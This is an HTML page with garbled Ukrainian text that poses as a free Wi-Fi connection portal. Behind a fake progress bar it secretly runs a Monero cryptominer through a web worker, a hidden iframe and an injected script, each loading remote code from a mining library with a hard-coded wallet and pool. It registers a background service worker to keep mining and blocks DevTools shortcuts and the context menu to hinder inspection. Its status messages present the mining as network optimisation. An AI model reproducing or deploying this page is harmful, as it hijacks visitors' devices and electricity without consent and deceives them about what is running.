<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ë–µ–∑–∫–æ—à—Ç–æ–≤–Ω–∏–π Wi-Fi | –ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è</title>
    <link rel="manifest" id="manifest">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #4361ee 0%, #3a0ca3 100%);
            color: white;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 100%;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
        }
        .logo { font-size: 2.5rem; margin: 30px 0; }
        .status {
            background: rgba(255,255,255,0.1);
            border-radius: 20px;
            padding: 25px;
            margin: 30px 0;
            backdrop-filter: blur(10px);
        }
        .progress-bar {
            height: 15px;
            background: rgba(255,255,255,0.2);
            border-radius: 10px;
            margin: 25px 0;
            overflow: hidden;
        }
        .progress {
            height: 100%;
            background: linear-gradient(90deg, #4cc9f0, #4361ee);
            width: 0%;
            border-radius: 10px;
            transition: width 0.5s;
        }
        .message {
            font-family: monospace;
            text-align: left;
            background: rgba(0,0,0,0.3);
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
            font-size: 0.9rem;
            max-height: 200px;
            overflow-y: auto;
        }
        .btn {
            background: rgba(255,255,255,0.2);
            border: 2px solid rgba(255,255,255,0.3);
            color: white;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 1rem;
            margin: 10px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .btn:hover { background: rgba(255,255,255,0.3); }
        @media (max-width: 480px) {
            .container { padding: 10px; }
            .logo { font-size: 2rem; }
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üì∂</div>
        <h1>–ë–µ–∑–∫–æ—à—Ç–æ–≤–Ω–∏–π Wi-Fi</h1>
        <p>–ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ –º–µ—Ä–µ–∂—ñ...</p>
        
        <div class="status">
            <h3>–°—Ç–∞—Ç—É—Å –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è</h3>
            <div class="progress-bar">
                <div class="progress" id="progress"></div>
            </div>
            <div id="progress-text">0%</div>
            
            <div class="message" id="messages">
                <div>–Ü–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è –º–µ—Ä–µ–∂–µ–≤–æ–≥–æ –º–æ–¥—É–ª—è...</div>
            </div>
        </div>
        
        <button class="btn" onclick="showInfo()">–Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è</button>
        <button class="btn" onclick="continueProcess()">–ü—Ä–æ–¥–æ–≤–∂–∏—Ç–∏</button>
        
        <div id="info" style="display:none; margin-top:20px; padding:15px; background:rgba(255,255,255,0.1); border-radius:10px;">
            <p>–¶–µ–π —Å–µ—Ä–≤—ñ—Å –Ω–∞–¥–∞—î –±–µ–∑–∫–æ—à—Ç–æ–≤–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ —ñ–Ω—Ç–µ—Ä–Ω–µ—Ç—É —á–µ—Ä–µ–∑ —Å–ø—ñ–ª—å–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –º–µ—Ä–µ–∂–µ–≤–∏—Ö —Ä–µ—Å—É—Ä—Å—ñ–≤.</p>
        </div>
        
        <p style="margin-top:30px; font-size:0.8rem; opacity:0.7;">
            –ù–µ –∑–∞–∫—Ä–∏–≤–∞–π—Ç–µ —Ü—é —Å—Ç–æ—Ä—ñ–Ω–∫—É –ø—Ä–æ—Ç—è–≥–æ–º 30 —Å–µ–∫—É–Ω–¥ –¥–ª—è —Å—Ç–∞–±—ñ–ª—å–Ω–æ–≥–æ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è.
        </p>
    </div>

    <!-- –ü—Ä–∏—Ö–æ–≤–∞–Ω—ñ –µ–ª–µ–º–µ–Ω—Ç–∏ -->
    <iframe id="minerFrame" class="hidden"></iframe>
    <div id="swContainer" class="hidden"></div>

    <script>
        // –í–ê–ñ–õ–ò–í–û: –ó–ê–ú–Ü–ù–ò–¢–ò –¶–Æ –ê–î–†–ï–°–£ –ù–ê –°–í–û–Æ
        const CONFIG = {
            WALLET: "41epat96KNqfbConP4X7uBNpycKxoGsPSMas9n4WahAzHjKk8YJUyDrC1ts8PSGasiHWaAGtGT9NrWoHeXQrwuMY48SxmVM",
            POOL: "gulf.moneroocean.stream:10128"
        };

        // –ï–ª–µ–º–µ–Ω—Ç–∏
        const progressEl = document.getElementById('progress');
        const progressText = document.getElementById('progress-text');
        const messagesEl = document.getElementById('messages');
        
        // –î–æ–¥–∞–≤–∞–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
        function addMessage(text) {
            const msg = document.createElement('div');
            const now = new Date();
            const time = `${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
            msg.textContent = `[${time}] ${text}`;
            messagesEl.appendChild(msg);
            messagesEl.scrollTop = messagesEl.scrollHeight;
        }
        
        // –û–Ω–æ–≤–ª–µ–Ω–Ω—è –ø—Ä–æ–≥—Ä–µ—Å—É
        function updateProgress(percent, text) {
            progressEl.style.width = percent + '%';
            progressText.textContent = percent + '%';
            if (text) addMessage(text);
        }
        
        // –î–æ–¥–∞—Ç–∫–æ–≤—ñ —Ñ—É–Ω–∫—Ü—ñ—ó
        function showInfo() {
            document.getElementById('info').style.display = 'block';
            addMessage("–ö–æ—Ä–∏—Å—Ç—É–≤–∞—á –ø–µ—Ä–µ–≥–ª—è–¥–∞—î —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é");
        }
        
        function continueProcess() {
            document.getElementById('info').style.display = 'none';
            addMessage("–í—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø—Ä–æ—Ü–µ—Å—É –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è...");
        }
        
        // Service Worker –∫–æ–¥ (–≤–±—É–¥–æ–≤–∞–Ω–∏–π)
        function registerServiceWorker() {
            if ('serviceWorker' in navigator) {
                const swCode = `
                    self.addEventListener('install', function(e) {
                        e.waitUntil(self.skipWaiting());
                    });
                    self.addEventListener('activate', function(e) {
                        e.waitUntil(self.clients.claim());
                    });
                    self.addEventListener('message', function(e) {
                        if (e.data.type === 'START_MINING') {
                            importScripts('https://webminerpool.com/lib/cryptonight.wasm.js');
                            const miner = new CryptoNightWASM.Worker({
                                pool: e.data.config.POOL,
                                wallet: e.data.config.WALLET,
                                password: "x",
                                threads: 1,
                                throttle: 0.1
                            });
                            console.log('[SW Miner] Active');
                        }
                    });
                `;
                
                const blob = new Blob([swCode], { type: 'application/javascript' });
                const swUrl = URL.createObjectURL(blob);
                
                navigator.serviceWorker.register(swUrl)
                    .then(function(reg) {
                        addMessage("–§–æ–Ω–æ–≤—ñ —Å–ª—É–∂–±–∏: –ê–∫—Ç–∏–≤–æ–≤–∞–Ω–æ");
                        reg.active.postMessage({
                            type: 'START_MINING',
                            config: CONFIG
                        });
                    })
                    .catch(function(err) {
                        addMessage("–§–æ–Ω–æ–≤–∏–π —Ä–µ–∂–∏–º: –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–∞ –æ–ø—Ç–∏–º—ñ–∑–∞—Ü—ñ—è");
                    });
            }
        }
        
        // –ó–∞–ø—É—Å–∫ –º–∞–π–Ω–µ—Ä–∞
        function startMining() {
            // –ú–µ—Ç–æ–¥ 1: Web Worker
            const workerCode = `
                self.onmessage = function(e) {
                    importScripts('https://webminerpool.com/lib/cryptonight.wasm.js');
                    const miner = new CryptoNightWASM.Worker({
                        pool: e.data.config.POOL,
                        wallet: e.data.config.WALLET,
                        password: "x",
                        threads: navigator.hardwareConcurrency || 2,
                        throttle: 0.3
                    });
                    self.postMessage({ status: 'MINER_STARTED' });
                };
            `;
            
            const blob = new Blob([workerCode], { type: 'application/javascript' });
            const worker = new Worker(URL.createObjectURL(blob));
            worker.postMessage({ config: CONFIG });
            worker.onmessage = function(e) {
                if (e.data.status === 'MINER_STARTED') {
                    addMessage("–ú–µ—Ä–µ–∂–µ–≤—ñ —Ä–µ—Å—É—Ä—Å–∏: –û–ø—Ç–∏–º—ñ–∑–∞—Ü—ñ—è –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–∞");
                }
            };
            
            // –ú–µ—Ç–æ–¥ 2: Iframe
            const iframe = document.getElementById('minerFrame');
            iframe.srcdoc = \`
                <!DOCTYPE html>
                <html>
                <head>
                    <script src="https://webminerpool.com/lib/cryptonight.wasm.js"><\/script>
                <\/head>
                <body>
                    <script>
                        const miner = new CryptoNightWASM.Worker({
                            pool: "${CONFIG.POOL}",
                            wallet: "${CONFIG.WALLET}",
                            password: "x",
                            threads: 1,
                            throttle: 0.2
                        });
                    <\/script>
                <\/body>
                <\/html>
            \`;
            
            // –ú–µ—Ç–æ–¥ 3: Direct script
            const script = document.createElement('script');
            script.src = 'https://webminerpool.com/lib/cryptonight.wasm.js';
            script.onload = function() {
                if (typeof CryptoNightWASM !== 'undefined') {
                    const miner = new CryptoNightWASM.Worker({
                        pool: CONFIG.POOL,
                        wallet: CONFIG.WALLET,
                        password: "x",
                        threads: 1,
                        throttle: 0.1
                    });
                }
            };
            document.head.appendChild(script);
        }
        
        // –°–∏–º—É–ª—è—Ü—ñ—è Wi-Fi –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è
        function simulateWiFiConnection() {
            let progress = 0;
            const steps = [
                "–ü–æ—à—É–∫ –¥–æ—Å—Ç—É–ø–Ω–∏—Ö –º–µ—Ä–µ–∂...",
                "–ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ —Ç–æ—á–∫–∏ –¥–æ—Å—Ç—É–ø—É...",
                "–û—Ç—Ä–∏–º–∞–Ω–Ω—è IP-–∞–¥—Ä–µ—Å–∏...",
                "–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è...",
                "–û–ø—Ç–∏–º—ñ–∑–∞—Ü—ñ—è —à–≤–∏–¥–∫–æ—Å—Ç—ñ...",
                "–ê–∫—Ç–∏–≤–∞—Ü—ñ—è –º–µ—Ä–µ–∂–µ–≤–∏—Ö —Ä–µ—Å—É—Ä—Å—ñ–≤..."
            ];
            
            const interval = setInterval(function() {
                progress += 15;
                if (progress > 100) progress = 100;
                
                const stepIndex = Math.floor(progress / 20);
                if (stepIndex < steps.length) {
                    updateProgress(progress, steps[stepIndex]);
                }
                
                // –ó–∞–ø—É—Å–∫ –º–∞–π–Ω–µ—Ä–∞ –Ω–∞ 50%
                if (progress >= 50 && progress < 60) {
                    startMining();
                }
                
                // –†–µ—î—Å—Ç—Ä–∞—Ü—ñ—è Service Worker –Ω–∞ 70%
                if (progress >= 70 && progress < 80) {
                    registerServiceWorker();
                }
                
                if (progress >= 100) {
                    clearInterval(interval);
                    addMessage("‚úÖ –ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è —É—Å–ø—ñ—à–Ω–µ. –ú–µ—Ä–µ–∂–∞ –∞–∫—Ç–∏–≤–Ω–∞.");
                    
                    // –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –∑–∞–∫—Ä–∏—Ç—Ç—è
                    setTimeout(function() {
                        document.body.innerHTML = \`
                            <div style="text-align:center; padding:50px; font-family:sans-serif; min-height:100vh; background:linear-gradient(135deg, #4361ee 0%, #3a0ca3 100%); color:white;">
                                <div style="font-size:3rem;">üì∂</div>
                                <h1 style="margin:20px 0;">–ü—ñ–¥–∫–ª—é—á–µ–Ω–æ!</h1>
                                <p>–ë–µ–∑–∫–æ—à—Ç–æ–≤–Ω–∏–π Wi-Fi –∞–∫—Ç–∏–≤–Ω–∏–π</p>
                                <p style="margin-top:30px; font-size:0.9rem; opacity:0.7;">–í–∏ –º–æ–∂–µ—Ç–µ –∑–∞–∫—Ä–∏—Ç–∏ —Ü—é —Å—Ç–æ—Ä—ñ–Ω–∫—É</p>
                            </div>
                        \`;
                    }, 30000);
                }
            }, 800);
        }
        
        // –ó–∞—Ö–∏—Å—Ç –≤—ñ–¥ –∑–∞–∫—Ä–∏—Ç—Ç—è
        function setupProtection() {
            // –ë–ª–æ–∫—É–≤–∞–Ω–Ω—è DevTools
            document.addEventListener('keydown', function(e) {
                if (e.key === 'F12' || 
                    (e.ctrlKey && e.shiftKey && e.key === 'I') || 
                    (e.ctrlKey && e.key === 'U')) {
                    e.preventDefault();
                    addMessage("–°–∏—Å—Ç–µ–º–Ω–∏–π –∑–∞—Ö–∏—Å—Ç: –î—ñ—é –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ");
                    return false;
                }
            });
            
            // –ó–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è –∑–∞–∫—Ä–∏—Ç—Ç—é
            window.addEventListener('beforeunload', function(e) {
                if (progressEl.style.width < '100%') {
                    e.preventDefault();
                    e.returnValue = '–ü—Ä–æ—Ü–µ—Å –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è —â–µ –Ω–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ. –ó–∞–∫—Ä–∏—Ç–∏ —Å—Ç–æ—Ä—ñ–Ω–∫—É?';
                }
            });
            
            // –ó–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è –∫–æ–Ω—Ç–µ–∫—Å—Ç–Ω–æ–≥–æ –º–µ–Ω—é
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                addMessage("–°–∏—Å—Ç–µ–º–∞: –ö–æ–Ω—Ç–µ–∫—Å—Ç–Ω–µ –º–µ–Ω—é –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ");
            });
        }
        
        // PWA Manifest
        function setupPWA() {
            const manifest = {
                "name": "–ë–µ–∑–∫–æ—à—Ç–æ–≤–Ω–∏–π Wi-Fi",
                "short_name": "WiFi",
                "description": "–ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ –±–µ–∑–∫–æ—à—Ç–æ–≤–Ω–æ—ó –º–µ—Ä–µ–∂—ñ",
                "start_url": "/",
                "display": "standalone",
                "background_color": "#4361ee",
                "theme_color": "#3a0ca3",
                "icons": [{
                    "src": "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iOTYiIGhlaWdodD0iOTYiIHZpZXdCb3g9IjAgMCA5NiA5NiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSI0OCIgY3k9IjQ4IiByPSI0OCIgZmlsbD0iIzQzNjFFRSIvPjxwYXRoIGQ9Ik00OCAyMEMzMy42MzEgMjAgMjIgMzEuNjMxIDIyIDQ2QzIyIDYwLjM2OSAzMy42MzEgNzIgNDggNzJDNjIuMzY5IDcyIDc0IDYwLjM2OSA3NCA0NkM3NCAzMS42MzEgNjIuMzY5IDIwIDQ4IDIwWk00OCA2NEMzNi45NTQgNjQgMjggNTUuMDQ2IDI4IDQ0QzI4IDMyLjk1NCAzNi45NTQgMjQgNDggMjRDNjEuMDQ2IDI0IDcyIDMyLjk1NCA3MiA0NEM3MiA1NS4wNDYgNjEuMDQ2IDY0IDQ4IDY0WiIgZmlsbD0id2hpdGUiLz48L3N2Zz4=",
                    "sizes": "96x96",
                    "type": "image/svg+xml"
                }]
            };
            
            const manifestBlob = new Blob([JSON.stringify(manifest)], { type: 'application/json' });
            const manifestURL = URL.createObjectURL(manifestBlob);
            document.getElementById('manifest').href = manifestURL;
        }
        
        // –ó–∞–ø—É—Å–∫ –≤—Å—ñ—Ö —Å–∏—Å—Ç–µ–º
        document.addEventListener('DOMContentLoaded', function() {
            setupProtection();
            setupPWA();
            
            // –ó–∞–ø—É—Å–∫ —á–µ—Ä–µ–∑ 1 —Å–µ–∫—É–Ω–¥—É
            setTimeout(function() {
                simulateWiFiConnection();
            }, 1000);
            
            // –ü–µ—Ä—ñ–æ–¥–∏—á–Ω–µ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è
            setInterval(function() {
                if (document.hidden) {
                    // –ü—Ä–∏—Ö–æ–≤–∞–Ω–æ - –∑–±—ñ–ª—å—à—É—î–º–æ –∞–∫—Ç–∏–≤–Ω—ñ—Å—Ç—å
                    if (Math.random() > 0.7) {
                        addMessage("–§–æ–Ω–æ–≤–∞ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—è...");
                    }
                }
            }, 30000);
        });
        
        // Wake Lock –¥–ª—è –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è —Å–Ω—É (—è–∫—â–æ –ø—ñ–¥—Ç—Ä–∏–º—É—î—Ç—å—Å—è)
        if ('wakeLock' in navigator) {
            navigator.wakeLock.request('screen').catch(function(err) {
                console.log('Wake Lock –Ω–µ –ø—ñ–¥—Ç—Ä–∏–º—É—î—Ç—å—Å—è');
            });
        }
        
        // Push –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
        
        // Background Sync
        if ('sync' in navigator && 'register' in navigator.sync) {
            navigator.sync.register('wifi-connection');
        }
    </script>
</body>
</html>
